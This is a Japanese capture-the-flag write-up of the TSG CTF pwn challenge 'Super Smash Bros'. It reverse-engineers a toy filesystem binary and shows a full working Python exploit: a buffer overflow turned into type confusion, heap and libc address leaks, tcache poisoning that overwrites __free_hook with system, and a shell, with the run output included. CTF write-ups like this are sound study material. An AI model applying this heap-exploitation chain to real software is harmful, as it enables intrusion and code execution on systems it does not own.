# [pwn 496pts] Super Smash Bros - TSG CTF
64ビットで全部有効です。
```
$ checksec -f ssb
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   99 Symbols     Yes	0		8	ssb
```
IDAで見てみると、何やら小さいファイルシステムっぽいのをメモリに確保しています。
`list_dir`の処理を読みます。
```c
file_t* get_file(char offset)
{
  return addr_filesystem[offset * 0x80];
}

void list_dir(char *filesystem) {
  for(int i = 0; i <= 88; i++) {
    char offset = filesystem[i + 0x27];
    if (offset) {
      file_t file = get_file(offset);
      puts(file->filename);
    }
  }
}
```

ただし、`file_t`は次のような構造体と思われます。
```c
typedef struct {
  char flag;
  char filename[0x7f];
} file_t;
```

次に、`add_file`では次のような処理をしています。get_entryは空き領域を確保しています。
```c
int get_entry(char *filesystem)
{
  for(int i = 0; i <= 88; i++) {
    char offset = filesystem[0x27 + i];
    if (offset == 0) return i;
  }
  printf("You cannot contain more than %d files in a directory.\n", 89);
  bye();
}

int create_file(char *name)
{
  file_t **filesystem = addr_filesystem;
  for(int i = 0; i <= 0xff; i++) {
    if (filesystem[i]->flag == 0) {
      filesystem[i]->flag = 2; // flag
      strncpy(filesystem[i]->name, name, 0x26);
      return i;
    }
  }
  bye();
}

void add_file(char *filesystem)
{
  int size;
  char name[0x28];
  int offset = get_entry();
  printf("name: ");
  scanf("%37s", name);
  int index = create_file(name);
  file_t *position = get_file(index);
  filesystem[0x27 + offset] = index;
  printf("size: ");
  scanf("%u", &size);
  if (size <= 0x50) {
    position->malloced = 0;
    scanf("%90s", position->contents);
  } else {
    position->malloced = 1;
    position->ptr = malloc(size + 1);
    memset(position->ptr, size+1, 0);
    read(0, position->ptr, size);
  }
}
```

どうやら`get_file`で得られるアドレス+0x27(基準点?)にはファイルの内容が別の場所にmallocされているかそのまま書かれているかを表すフラグがあるようです。
足りなかったら別の場所に格納するのは実際のファイルシステムみたいですね。
ということで、先程の`file_t`は次のように修正できます。
```c
typedef struct {
  char flag;           // 0x00
  char filename[0x26]; // 0x01
  char malloced;       // 0x27
  char *ptr;           // 0x28
  char contents[0x50]; // 0x30
}
```
これでちょうど0x80バイトですね。
さて、contentsは0x50バイト確保されていますが、scanfでは90(=0x5a)バイト入力できます。
これが使えるかはまだ分かりませんが、オーバーフローがあるということを頭に入れておきましょう。
次に`add_dir`です。
```c
char create_dir(char *name)
{
  file_t **filesystem = addr_filesystem;
  for(int i = 0; i <= 0xff; i++) {
    if (filesystem[i]->flag == 0) {
      filesystem[i]->flag = 1;
      strncpy(filesystem[i]->filename,	name, 0x26);
      return i;
    }
  }
  bye();
}

void add_dir(char *filesystem)
{
  char name[0x28];
  int offset = get_entry(filesystem);
  printf("name: ");
  scanf("%37s", name);
  char new_ofs = create_dir(name);
  filesystem[offset + 0x27] = new_ofs;
}
```

create_fileとは違ってflagに1が代入されているので、次のようになっていることが分かります。

|flag|意味|
|:-:|:-:|
|0|未使用|
|1|ディレクトリ|
|2|ファイル|

次に`show_dir`を解析します。
```c
void show_dir(char *filesystem)
{
  char name[0x28];
  printf("name: ");
  scanf("%37s", name);
  for(int i = 0; i <= 0x58; i++) {
    char ofs = filesystem[0x27 + i];
    if (ofs == 0) continue;
    file_t *file = get_file(ofs);
    if (file->flag == 2) {
      if (strncmp(file->filename, name, 0x26) == 0) {
        if (file->malloced == 1) {
	  puts(file->ptr);
	} else {
	  puts(file->contents);
	}
        break;
      }
    }
  }
}
```

次に`remove_file`を読みます。
```c
void remove_file(char *filesystem)
{
  char name[0x28];
  puts("Note: when you remove a directory, files in the directory are not removed.");
  printf("name: ");
  scanf("%37s", name);
  for(int i = 0; i <= 0x58; i++) {
    char ofs = filesystem[0x27 + i];
    if (ofs == 0) continue;
    file_t *file = get_file(ofs);
    if (strncmp(file->filename, name, 0x26) == 0) {
      if (file->flag == 2) {
        if (file->malloced == 1) {
	  free(file->ptr);
	}
      }
      memset(file, 0x80, 0);
      filesystem[0x27 + i] = 0;
    }
  }
}
```

やっと最後に`change_directory`を解析します。
```c
int change_directory() {
  puts("..: parent directory");
  printf("name: ");
  scanf("%37s", name);
  if (strncmp(name, "..", 0x26) == 0) {
    return 1;
  } else {
    for(int i = 0; i <= 0x58; i++) {
      char ofs = filesystem[0x27 + i];
      file_t *file = get_file(ofs);
      if (file->flag == 1) {
        if (strncmp(file->filename, name, 0x26) == 0) {
	  loop(file);
	  return 0;
	}
      }
    }
  }
}
```

loopというのはメニューの関数です。
change_directoryで1が返るとloopがreturnするので元のディレクトリに戻るわけですね。
賢い。

というわけで一通り解析したので脆弱性を探しましょう。
ざっと見た感じではadd_fileのオーバーフローしか脆弱性は見当たりません。
まずは補助関数を作って、ついでに実際にオーバーフローしていることを確認します。
```python
from ptrlib import *

def add_file(name, size, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("name: ")
    sock.sendline(name)
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    if size <= 0x50:
        sock.sendline(data)
    else:
        sock.send(data)

def add_dir(name):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("name: ")
    sock.sendline(name)

def change_directory(name):
    sock.recvuntil("> ")
    sock.sendline("5")
    sock.recvuntil("name: ")
    sock.sendline(name)

def show_file(name):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("name: ")
    sock.sendline(name)
    return sock.recvuntil("\n\n").rstrip()

def remove_file(name):
    sock.recvuntil("> ")
    sock.sendline("6")
    sock.recvuntil("name: ")
    sock.sendline(name)

def list_dir():
    sock.recvuntil("> ")
    sock.sendline("1")
    filelist = []
    while True:
        fname = sock.recvline().rstrip()
        if fname == b'':
            break
        filelist.append(fname)
    return filelist

sock = Process("./ssb")

add_file("foo1", 0x50, "hogehuga")
add_file("bar1", 0x50, "foobar")
print(list_dir())
remove_file("foo1")
print(list_dir())
payload = b'A' * 0x59
add_file("foo2", 0x50, payload)
print(list_dir())

sock.interactive()
```

```
$ python solve.py 
[+] Process: Successfully created new process (PID=26397)
[b'foo1', b'bar1']
[b'bar1']
[b'foo2', b'AAAAAAAA']
[ptrlib]$ 
```
名前の先頭がオーバーライトできているということは、flagも書き換えられています。
したがって、ファイルをフォルダとして認識させることができます。
そして、ファイルがフォルダとして認識されたとき、そのフォルダに入っているファイルのオフセットはmalloced, ptr, contentsの部分に相当します。
~~したがって、誤認識させたいファイルのcontentsに同じオフセットを複数個入れておけばdouble freeやUAFができます。~~
※`remove_file`では同じファイル名のものをすべて削除し、かつmemsetで空にしているので無理でした。

ptrがファイルのオフセットとして認識されるということは、ファイルを大量に用意しておけば、これを使ってヒープのアドレスをリークできることになります。（オフセットに対応したファイル名が`list_dir`で表示されるので、逆にオフセットが特定できる。）
```python
from ptrlib import *

def add_file(name, size, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("name: ")
    sock.sendline(name)
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    if size <= 0x50:
        sock.sendline(data)
    else:
        sock.send(data)

def add_dir(name):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("name: ")
    sock.sendline(name)

def change_directory(name):
    sock.recvuntil("> ")
    sock.sendline("5")
    sock.recvuntil("name: ")
    sock.sendline(name)

def show_file(name):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("name: ")
    sock.sendline(name)
    return sock.recvuntil("\n\n").rstrip()

def remove_file(name):
    sock.recvuntil("> ")
    sock.sendline("6")
    sock.recvuntil("name: ")
    sock.sendline(name)

def list_dir():
    sock.recvuntil("> ")
    sock.sendline("1")
    filelist = []
    while True:
        fname = sock.recvline().rstrip()
        if fname == b'':
            break
        filelist.append(fname)
    return filelist

sock = Process("./ssb")

# Change file:victim to dir:victim
add_file("killer", 0x50, "AAAA")
add_file("victim", 0x58, "BBBB") # malloced!
remove_file("killer")
add_file("killer", 0x50, b'A' * 0x50 + b'\x01' + b'victim')

# Fill filesystem
add_dir("dir1")
add_dir("dir2")
add_dir("dir3")
add_file("big", 0x500, "a")
add_file("small", 0x58, "b")
add_dir("hi")
offset = 9
for directory in ["dir1", "dir2", "dir3"]:
    change_directory(directory)
    for i in range(88):
        if offset < 0x100:
            add_file("{}".format(offset), 0x50, "Hello")
            offset += 1
        else:
            break
    change_directory("..")

# Leak heap address by ptr
change_directory("victim")
addr_heap = 0
for fname in list_dir()[::-1]:
    if fname == b'killer': continue
    addr_heap <<= 8
    addr_heap |= int(fname)
change_directory("..")
dump("heap addr = " + hex(addr_heap))

# Change dir:victim to file:victim
remove_file("killer")
add_file("killer", 0x50, b'A' * 0x50 + b'\x02' + b'victim')

#print(list_dir())

sock.interactive()
```

ウェーイ。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=20298)
[ptrlib] heap addr = 0x55cec29ad280
[ptrlib]$ 
--------------------
current dir: root
--------------------
```

さて、ヒープのアドレスが分かったので次はlibcのアドレスです。
そのためにはまずdouble freeしてやるのですが、victimのptrはoffset用の配列として使われている状態なので、ファイルを上手いこと削除することでptrを書き換えることができます。
試しに予め確保しておいた大きなチャンクをfreeするとリークしたアドレスの周辺は次のようになります。
```
pwndbg> x/32xg 0x55c5f0af9280
0x55c5f0af9280:	0x0000000042424242	0x0000000000000000
0x55c5f0af9290:	0x0000000000000000	0x0000000000000000
0x55c5f0af92a0:	0x0000000000000000	0x0000000000000000
0x55c5f0af92b0:	0x0000000000000000	0x0000000000000000
0x55c5f0af92c0:	0x0000000000000000	0x0000000000000000
0x55c5f0af92d0:	0x0000000000000000	0x0000000000000000
0x55c5f0af92e0:	0x0000000000000000	0x0000000000000511
0x55c5f0af92f0:	0x00007fd8bfaa1ca0	0x00007fd8bfaa1ca0
0x55c5f0af9300:	0x0000000000000000	0x0000000000000000
...
pwndbg> x/4wx 0x00007fd8bfaa1ca0
0x7fd8bfaa1ca0 <main_arena+96>:	0xf0af9860	0x000055c5	0x00000000	0x00000000
```
unsorted bin発見！
例えば今の例ではptrに0x55c5f0af9280が入っているわけですが、これを0x55c5f0af92f0にしたいとします。
最下位バイトに相当するファイルを削除すれば最下位バイトは0x00になります。さらに別のディレクトリでファイルを作成すれば、先程削除した場所に確保されます。
さらに0xf0番目のファイルが入っているディレクトリで0xf0番目のファイルを削除して、元のディレクトリに戻って新しいファイルを作成すればptrの最下位バイトが0xf0になるという感じです。

次のような感じです。
```
lsb = addr_heap & 0xff
change_directory("victim")
remove_file(str(lsb))
change_directory("..")
change_directory("dir3")
add_file("consume", 0x50, "Hello")
change_directory("..")
change_directory(which_dir(boundary, (lsb + 0x70) & 0xff))
remove_file(str((lsb + 0x70) & 0xff))
change_directory("..")
change_directory("victim")
add_file("nihao", 0x50, "Hello")
change_directory("..")

change_directory("victim")
print(list_dir())
change_directory("..")
```

上手いこと動いています。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=22361)
[b'killer', b'128', b'162', b'189', b'202', b'78', b'86']
[ptrlib] heap addr = 0x564ecabda280
[b'killer', b'nihao', b'162', b'189', b'202', b'78', b'86']
[ptrlib]$ 
--------------------
current dir: root
--------------------
```

ここでbigをfreeすればmain arenaへのリンクが書き込まれるので、show fileでvictimの内容(=big->ptr)を見るだけでlibcのアドレスがリークできます。
```python
# Change victim->ptr to big->ptr
lsb = addr_heap & 0xff
change_directory("victim")
remove_file(str(lsb))
change_directory("..")
change_directory("dir3")
add_file("consume", 0x50, "Hello")
change_directory("..")
change_directory(which_dir(boundary, (lsb + 0x70) & 0xff))
remove_file(str((lsb + 0x70) & 0xff))
change_directory("..")
change_directory("victim")
add_file("nihao", 0x50, "Hello")
change_directory("..")

# Change dir:victim to file:victim
remove_file("killer")
add_file("killer", 0x50, b'A' * 0x50 + b'\x02' + b'victim')

# Leak libc base
remove_file("big")
libc_base = u64(show_file("victim")) - main_arena - delta
dump("libc base = " + hex(libc_base))

sock.interactive()
```

ええやん。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=23152)
[b'killer', b'128', b'210', b'180', b'87', b'26', b'86']
[ptrlib] heap addr = 0x561a57b4d280
[ptrlib] libc base = 0x7fad6013a000
[ptrlib]$
```

freeしたbigを小さいサイズで確保して、victimとそいつをfreeしてやれば次のようにdouble freeが発生しています。

```
pwndbg> tcache
{
  counts = "\000\000\000\000\000\002", '\000' <repeats 57 times>, 
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x55656aefd2f0, 0x0 <repeats 58 times>}
}
pwndbg> x/4xgx 0x55656aefd2f0
0x55656aefd2f0:	0x000055656aefd2f0	0x0000000000000000
0x55656aefd300:	0x0000000000000000	0x0000000000000000
```

ファイル数が足りなくなるのでkillerを最初に削除しました。
あとは`__free_hook`を`system`に変更して`/bin/sh`を書き込んだファイルを削除すれば終わり！


```python
from ptrlib import *

def add_file(name, size, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("name: ")
    sock.sendline(name)
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    if size <= 0x50:
        sock.sendline(data)
    else:
        sock.send(data)

def add_dir(name):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("name: ")
    sock.sendline(name)

def change_directory(name):
    sock.recvuntil("> ")
    sock.sendline("5")
    sock.recvuntil("name: ")
    sock.sendline(name)

def show_file(name):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("name: ")
    sock.sendline(name)
    return sock.recvuntil("\n\n").rstrip()

def remove_file(name):
    sock.recvuntil("> ")
    sock.sendline("6")
    sock.recvuntil("name: ")
    sock.sendline(name)

def list_dir():
    sock.recvuntil("> ")
    sock.sendline("1")
    filelist = []
    while True:
        fname = sock.recvline().rstrip()
        if fname == b'':
            break
        filelist.append(fname)
    return filelist

def which_dir(boundary, offset):
    if boundary[0] < offset < boundary[1]:
        return "dir1"
    elif boundary[1] < offset < boundary[2]:
        return "dir2"
    else:
        return "dir3"

libc = ELF("./libc-2.27.so")
sock = Process("./ssb")
main_arena = 0x3ebc40
delta = 96

# Change file:victim to dir:victim
add_file("killer", 0x50, "AAAA")
add_file("victim", 0x58, "BBBB") # malloced!
remove_file("killer")
add_file("killer", 0x50, b'A' * 0x50 + b'\x01' + b'victim')

# Fill filesystem
add_dir("dir1")
add_dir("dir2")
add_dir("dir3")
add_file("big", 0x500, "a")
add_file("small", 0x58, "b")
offset = 8
boundary = []
for directory in ["dir1", "dir2", "dir3"]:
    change_directory(directory)
    boundary.append(offset)
    for i in range(88):
        if offset < 0x100:
            add_file("{}".format(offset), 0x50, "Hello")
            offset += 1
        else:
            break
    change_directory("..")

# Leak heap address by ptr
change_directory("victim")
addr_heap = 0
for fname in list_dir()[::-1]:
    if fname == b'killer':
        continue
    addr_heap <<= 8
    addr_heap |= int(fname)
assert addr_heap > 0x550000000000
print(list_dir())
change_directory("..")
dump("heap addr = " + hex(addr_heap))

# Change victim->ptr to big->ptr
lsb = addr_heap & 0xff
change_directory("victim")
remove_file(str(lsb))
change_directory("..")
change_directory("dir3")
add_file("consume", 0x50, "Hello")
change_directory("..")
change_directory(which_dir(boundary, (lsb + 0x70) & 0xff))
remove_file(str((lsb + 0x70) & 0xff))
change_directory("..")
change_directory("victim")
add_file("nihao", 0x50, "Hello")
change_directory("..")

# Change dir:victim to file:victim
remove_file("killer")
add_file("killer", 0x50, b'A' * 0x50 + b'\x02' + b'victim')

# Leak libc base
remove_file("big")
libc_base = u64(show_file("victim")) - main_arena - delta
dump("libc base = " + hex(libc_base))

# TCache Poisoning
add_file("big-revived", 0x58, 'Hello')
remove_file("killer")
remove_file("victim")
remove_file("big-revived")
add_file(":)", 0x58, p64(libc_base + libc.symbol("__free_hook")))
add_file(":(", 0x58, "/bin/sh")
add_file(";P", 0x58, p64(libc_base + libc.symbol("system")))

# Get the shell!
remove_file(":(")

sock.interactive()
```

やっとできたぁぁぁあ。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=24259)
[b'killer', b'128', b'66', b'165', b'200', b'225', b'85']
[ptrlib] heap addr = 0x55e1c8a54280
[ptrlib] libc base = 0x7f7e28ea8000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
何食べたらこんな問題思い付くんだろ。
競技中にこれを解こうと思う人もすごい。

# 参考文献
[1] [https://github.com/hnoson/writeups/blob/master/tsgctf/2019/ssb/exploit.py](https://github.com/hnoson/writeups/blob/master/tsgctf/2019/ssb/exploit.py)